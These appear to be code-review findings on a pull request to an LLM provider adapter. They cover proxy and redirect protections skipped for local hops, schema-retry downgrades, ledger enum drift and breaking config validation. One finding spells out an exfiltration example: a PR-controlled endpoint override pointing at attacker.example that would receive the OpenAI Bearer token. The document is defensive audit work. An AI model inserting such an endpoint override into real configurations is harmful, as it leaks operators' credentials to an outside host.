findings.cross_file_justification: endpoint_policy.hop_is_local inherits dispatch_group from the provider when the model entry is silent, and validate_providers permits such a provider to use a local HTTPS endpoint without allow_insecure_endpoint. The adapter only copies and checks the model-level dispatch_group.
findings.description: Provider-level local declarations bypass the transport protections. A provider with dispatch_group: local, endpoint https://127.0.0.1:8443/v1, ordinary authentication, and no model-level dispatch_group is classified as local, but _transport_policy returns None because neither condition matches.
findings.failure_mode: Under local_voices, the request uses the ordinary transport with proxy environment variables enabled. An HTTPS_PROXY can therefore receive the local request connection, violating the promised proxy isolation and potentially exposing prompts and credentials to an intercepting proxy.
findings.suggested_fix: Resolve the effective dispatch_group consistently with hop_is_local, including provider-level inheritance, and apply TransportPolicy to every hop classified as local. Add a regression case for a provider-level local declaration without an insecure-endpoint opt-in.

findings.description: The load-time gate admits `allow_insecure_endpoint` + `http://` endpoints and `dispatch_group: local` labels for ANY provider type (no `type` check in validate_providers / _local_label_refusal), but the request-time half of D-7.2 (`TransportPolicy`: trust_env=False, no redirects, path-prefix) is wired only into `OpenAIAdapter._transport_policy` / `_dispatch`. The anthropic, bedrock, google (and any other) adapters are untouched by this PR and still call `http_post` / `http_post_stream` without `policy`, so for an opted-in `anthropic`-type provider at `http://192.168.1.5:8080` httpx honours HTTP_PROXY/HTTPS_PROXY and the urllib fallback follows a 3xx to any host, carrying the `x-api-key` header. The module docstring promises these rules for 'the adapter' of every opted-in/local provider.
findings.failure_mode: A config the gate accepts (opt-in or local label on a non-OpenAI provider type) runs with none of the documented request-time protections: plaintext request routed through a proxy env var, or redirected off-host with the credential attached, while MODELINV still records hop_locality=local.
findings.suggested_fix: Either (a) in validate_providers refuse `allow_insecure_endpoint` and `dispatch_group: local` when `prov['type']` is not in ('openai','openai_compat') with a named CONFIG-INVALID reason, or (b) move policy construction into ProviderAdapter base so every HTTP adapter passes `policy=` to http_post/http_post_stream/http_get. Add a test asserting a non-OpenAI opted-in provider is either refused at load or dispatched under TransportPolicy.

findings.cross_file_justification: head/.claude/adapters/loa_cheval/config/endpoint_policy.py:hop_is_local (~line 213) and _local_labels (~line 164) treat a provider-block `dispatch_group: local` as authoritative when the model entry is silent, and validate_local_fallbacks (~line 262) classifies such models as local under local_voices. cheval.py's _build_provider_config only reads `model_data.get('dispatch_group')`, and modelinv.hop_locality_of (~line 473) only reads the model entry.
findings.description: The loader's local-hop rule honours `dispatch_group: local` on the provider block as a fallback for models that do not declare it (hop_is_local, _local_labels, validate_local_fallbacks all use `entry.get('dispatch_group') or prov.get('dispatch_group')`). cheval's `_build_provider_config` populates `ModelConfig.dispatch_group` from the model entry only, so for a non-keyless local provider (e.g. vLLM with --api-key, `dispatch_group: local` at the provider level) every model gets `dispatch_group=None`. Consequently `OpenAIAdapter._transport_policy` returns None (no trust_env=False, redirects followed on urllib, no path-prefix check) and `modelinv.hop_locality_of` records `hop_locality: hosted` for a hop the planner and the local_voices fallback audit treat as local. (Assumes the loader does not flatten provider-level keys into each model entry; the diff shows no such step.)
findings.failure_mode: Under `hounfour.locality: local_voices` a hop the planner classified as local runs without the D-7.2 request-time rules (proxy env honoured, redirects followed) and every MODELINV row for it carries the wrong `hop_locality`, so the FR-8 audit trail contradicts the planner.
findings.suggested_fix: In _build_provider_config compute `dispatch_group=model_data.get('dispatch_group') or prov.get('dispatch_group')`, and make modelinv.hop_locality_of delegate to endpoint_policy.hop_is_local(hounfour, provider, model_id) so there is one implementation (as hop_is_local's docstring already claims). Add a test with provider-block-only `dispatch_group: local` asserting TransportPolicy is applied and hop_locality == 'local'.

findings.description: check_endpoint deliberately runs `validate_declared_endpoint` without the loa-providers.json host allowlist ('an operator-declared https host is not on' it), so any public https host is admitted for any provider, including the catalog providers whose `auth` is an env reference (OPENAI_API_KEY etc.). The loader reads the checkout's `.loa.config.yaml`, which on a PR-head checkout is author-controlled. A PR that sets `hounfour.providers.openai.endpoint: https://attacker.example/v1` passes this new gate and the Bearer token is sent to the attacker on the first dissent/review hop. The new 'trusted configuration' concept in this PR only gates Bridgebuilder planning, not the cheval request path, while SKILL.md asserts keys follow trusted precedence 'even when the checkout is a PR head'.
findings.failure_mode: Credential exfiltration in unattended review of untrusted PRs: the environment API key is sent to an attacker-chosen https host while the gate reports the endpoint as valid.
findings.suggested_fix: For providers whose resolved `auth` is an env reference (i.e. a real secret will be attached), require the endpoint host to be on the loa-providers.json allowlist OR equal the System-Zone catalog host for that provider; refuse an endpoint override from the project layer otherwise (CONFIG-INVALID with a named reason). Alternatively have cheval load providers from the trusted config path Bridgebuilder uses, and correct the SKILL.md claim until that holds.

findings.description: `_build_chat_body` always sends `strict: True`. OpenAI strict mode rejects most ordinary schemas (missing `additionalProperties: false`, optional properties, unsupported keywords) with a 400 whose body names `response_format`, so the common failure for a valid-but-non-strict schema is a silent downgrade: the adapter resends the full prompt without the schema, the answer is unenforced, and the operator only learns of it via a WARN and `schema_rejected_by_server`. The substring heuristic also fires on any 400 whose body happens to contain `json_schema`/`response_format` (e.g. a server that echoes request fields in a different validation error), and each retry re-bills the prompt tokens while `latency_ms` reports only the second attempt.
findings.failure_mode: Operator requested enforced structured output; result is produced unenforced after two paid round-trips, with the degradation visible only in telemetry.
findings.suggested_fix: Send `strict: True` only when the schema is strict-compatible (or add a per-model catalog knob), and narrow the retry trigger to errors whose `param` is `response_format` (OpenAI's error envelope carries `error.param`) rather than a substring match. Surface the downgrade at the CLI (stderr) not just MODELINV.

findings.cross_file_justification: pricing_source_for introduces a third ledger `pricing_source` value (`stale_catalog`). The diff updates rollup.py's priced set but not the other readers of the JSONL ledger (cost-report.sh, which reads entries directly per rollup.py's own comment; the dissent budget gate in adversarial-review.sh) nor any ledger JSON schema enumerating pricing_source.
findings.description: A new enum value is written into every ledger row for a stale-priced model. Readers that test `pricing_source == "config"` to decide whether a row is priced (or to sum priced cost) will now classify those rows as unpriced, under-reporting spend exactly for the models the stale flag is meant to highlight. Only rollup.py was updated in the diff.
findings.failure_mode: Cost reports and budget gates silently drop or misbucket stale-catalog rows after the first catalog entry gains a price_date older than 90 days.
findings.suggested_fix: Grep every consumer of `pricing_source` (cost-report.sh, adversarial-review.sh budget helpers, any ledger schema) and extend the priced set to include `stale_catalog`; add a ledger-read test with a stale row asserting it is counted as priced.

findings.description: `validate_providers(merged)` is config-wide and fail-closed: a single provider block that fails the new rule (a pre-cycle-129 Ollama entry at `http://localhost:11434/v1` with no `allow_insecure_endpoint`, or an internal gateway declared as `https://10.0.0.5/v1` without a local label) raises ConfigError from load_config, which aborts every cheval invocation including hops to unrelated hosted providers, the health probe, and `endpoint_policy describe-provider`. This is a breaking change for existing configs with no migration path other than editing the file.
findings.failure_mode: Upgrading the framework turns a previously working, unused provider block into a hard failure of all model access until the operator edits config.
findings.suggested_fix: Document the breaking change prominently and make the refusal message name the exact key to add (`allow_insecure_endpoint: <host>` / `dispatch_group: local`). Consider scoping: refuse the offending provider (drop it from the merged view with a WARN and a MODELINV/health-probe signal) rather than failing the whole load, or at minimum ensure the refusal surfaces as a named exit code rather than a generic config failure.
